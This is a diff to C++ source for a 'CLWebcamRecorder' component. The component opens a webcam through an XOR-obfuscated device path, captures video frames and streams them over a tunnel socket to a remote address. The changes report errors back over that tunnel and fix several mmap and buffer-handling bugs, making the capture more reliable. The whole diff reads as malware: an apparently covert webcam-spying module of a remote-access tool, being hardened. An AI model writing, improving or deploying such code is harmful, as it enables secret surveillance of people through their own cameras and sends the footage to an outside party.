@@ -9,6 +9,7 @@ void CLWebcamRecorder::run() {
     memcpy(&device_num_, argv_, sizeof(uint32_t));
 
     if (webcam_init() < 0) {
+        send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
         return;
     }
     printf("[run] Initialization successful\n");
@@ -21,6 +22,7 @@ void CLWebcamRecorder::run() {
 
         int rc = select(dev_fd_ + 1, &fds, NULL, NULL, &tv);
         if (rc < 0) {
+            send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
             printf("[run] Error with select\n");
             break;
         } else if (rc == 0) {
@@ -33,18 +35,21 @@ void CLWebcamRecorder::run() {
         buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
         buf.memory = V4L2_MEMORY_MMAP;
         if (ioctl(dev_fd_, VIDIOC_DQBUF, &buf) < 0) {
+            send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
             printf("[run] Error when dequeing the buffer\n");
             break;
         }
         
         // Send as raw decoded mjpeg image
-        rc = send_frame(buf.index);
+        rc = send_frame(&buf);
         if (rc < 0) {
+            send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
             break;
         }
 
         // Requeue the buffer
         if (ioctl(dev_fd_, VIDIOC_QBUF, &buf) < 0) {
+            send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
             printf("[run] Error when requeing the buffer\n");
             break;
         }
@@ -58,6 +63,7 @@ void CLWebcamRecorder::run() {
 
 int CLWebcamRecorder::webcam_init() {
     // Open the target video device
+    memset(buffers_, 0, sizeof(buffers_));
     unsigned char obf[] = {0x80, 0xcb, 0xca, 0xd9, 0x80, 0xd9, 0xc6, 0xcb, 0xca, 0xc0};
     char input_path[PATH_MAX];
 
@@ -72,9 +78,9 @@ int CLWebcamRecorder::webcam_init() {
 
     strncpy(input_path + sizeof(obf), str_device_num, num_size);
 
-    printf("File name is: %s\n", input_path);
+    printf("[webcam_init] File name is: %s\n", input_path);
 
-    dev_fd_ = open(input_path, O_RDONLY);
+    dev_fd_ = open(input_path, O_RDWR);
     if (dev_fd_ < 0) {
         printf("[webcam_init] Error while opening the dev\n");
         return -1;
@@ -106,6 +112,7 @@ int CLWebcamRecorder::webcam_init() {
     for (int i=0;i<BUFFER_COUNT;i++) {
         struct v4l2_buffer buf = {};
         buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
+        buf.memory = V4L2_MEMORY_MMAP;
         buf.index = i;
 
         if (ioctl(dev_fd_, VIDIOC_QUERYBUF, &buf) < 0) {
@@ -115,6 +122,10 @@ int CLWebcamRecorder::webcam_init() {
         
         
         buffers_[i].start_= mmap(NULL, buf.length, PROT_READ | PROT_WRITE, MAP_SHARED, dev_fd_, buf.m.offset);
+        if (buffers_[i].start_ == MAP_FAILED) {
+            printf("[webcam_init] Error mapping the buffers\n");
+            return -1;
+        }
         buffers_[i].length_ = buf.length;
     }
 
@@ -140,9 +151,14 @@ int CLWebcamRecorder::webcam_init() {
     return 0;
 }
 
-int CLWebcamRecorder::send_frame(unsigned int __index) {
-    void* p_buf = buffers_[__index].start_;
-    if (sendto(tunnel_socket_, p_buf, buffers_[__index].length_, 0, (struct sockaddr*) &tunnel_addr_, tunnel_addr_len_) < 0) {
+int CLWebcamRecorder::send_frame(struct v4l2_buffer* __p_buf) {
+    if (__p_buf->index >= BUFFER_COUNT) {
+        printf("[send_frame] invalid __index: %u\n", __p_buf->index);
+        return -1;  
+    }
+    void* p_buf = buffers_[__p_buf->index].start_;
+    if (p_buf)
+    if (sendto(tunnel_socket_, p_buf, __p_buf->bytesused, 0, (struct sockaddr*) &tunnel_addr_, tunnel_addr_len_) < 0) {
         return -1;
     }
 
